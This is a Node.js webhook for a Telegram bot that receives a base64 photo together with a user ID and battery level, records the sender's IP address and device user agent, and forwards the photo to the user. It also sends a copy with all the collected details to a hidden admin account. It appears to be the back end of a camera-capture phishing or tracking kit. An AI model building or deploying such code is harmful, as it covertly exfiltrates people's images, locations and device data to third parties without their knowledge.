const { Telegraf } = require('telegraf');
const bot = new Telegraf(process.env.BOT_TOKEN);

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).send('Method Not Allowed');
  }

  try {
    const { image, uid, battery } = req.body;
    const adminId = process.env.ADMIN_ID;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const timestamp = new Date().toLocaleString('en-US', {
      timeZone: 'Asia/Kabul',
      hour12: false,
    });

    if (!uid || !image) return res.status(400).send('UID or image missing');

    const base64 = image.replace(/^data:image\/\w+;base64,/, '');
    const imgBuffer = Buffer.from(base64, 'base64');

    // ✅ کارونکي ته عکس لیږل
    await bot.telegram.sendPhoto(uid, { source: imgBuffer });

    // ✅ اډمین ته د معلوماتو سره عکس لیږل
    if (adminId) {
      const caption = `
📸 *New Image Received from User*

🆔 *User ID:* \`${uid}\`
🔋 *Battery:* \`${battery || '?'}%\`
🌐 *IP:* \`${ip}\`
📱 *Device:* \`${userAgent}\`
🕒 *Time:* \`${timestamp}\`

🧑🏻‍💻 Built by: *WACIQ*
`.trim();

      await bot.telegram.sendPhoto(adminId, { source: imgBuffer }, {
        caption,
        parse_mode: 'Markdown'
      });
    }

    res.status(200).send('✅ Image delivered');
  } catch (err) {
    console.error(err);
    res.status(500).send('❌ Sending error');
  }
}; 
